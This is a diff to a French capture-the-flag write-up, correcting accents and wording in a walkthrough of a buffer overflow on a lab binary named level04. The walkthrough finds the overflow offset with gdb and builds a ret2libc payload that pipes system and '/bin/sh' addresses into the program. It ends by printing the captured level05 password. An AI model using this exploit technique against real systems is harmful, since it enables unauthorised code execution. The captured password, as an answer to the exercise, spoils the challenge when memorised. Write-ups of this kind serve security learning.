@@ -12,7 +12,7 @@ Give me some shellcode, k
 Ctrl+C
 ```
 
-Il y a deux methode pour trouver la bon nombre de `A` a entrer:
+Il y a deux méthodes pour trouver la bon nombre de `A` à entrer:
 
 ```bash
 $ gdb level04 -q
@@ -30,10 +30,10 @@ Program received signal SIGSEGV, Segmentation fault.
 [Switching to process 2245]
 0x41326641 in ?? ()
 
-# go on wiremask and he will give you: Register value 0x41326641 => Offset 156
+# go to wiremask and it will give you: Register value 0x41326641 => Offset 156
 ```
 
-Or
+Ou
 
 ```shell
 $ python -c 'print("A" * 155)' | ./level04
@@ -46,13 +46,13 @@ Give me some shellcode, k
 Ctrl+C
 ```
 
-On va essayer de faire un ret2libc. Notre argument va ressembler a
+On va essayer de faire un ret2libc. Notre argument va ressembler à
 
 ```shell
 $ python -c 'print("A" * 156 + "AdresseSystem" + "OSEF" + "AdresseBinSH")'
 ```
 
-allons recuperer ces deux adresses
+Allons récuperer ces deux adresses
 
 ```shell
 $ gdb level04 -q
@@ -75,7 +75,7 @@ warning: Unable to access target memory at 0xf7fd3b74, halting search.
 1 pattern found.
 ```
 
-On trouve alors `AdresseSystem = 0xf7e6aed0` et `AdresseBinSH = 0xf7f897ec`, plus qu'a remplacer et essayer
+On trouve alors `AdresseSystem = 0xf7e6aed0` et `AdresseBinSH = 0xf7f897ec`, plus qu'à remplacer et essayer
 
 ```shell
 $ (python -c 'print("A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "OSEF" + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level04
@@ -84,4 +84,4 @@ cat /home/users/level05/.pass
 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
 ```
 
-lien: https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
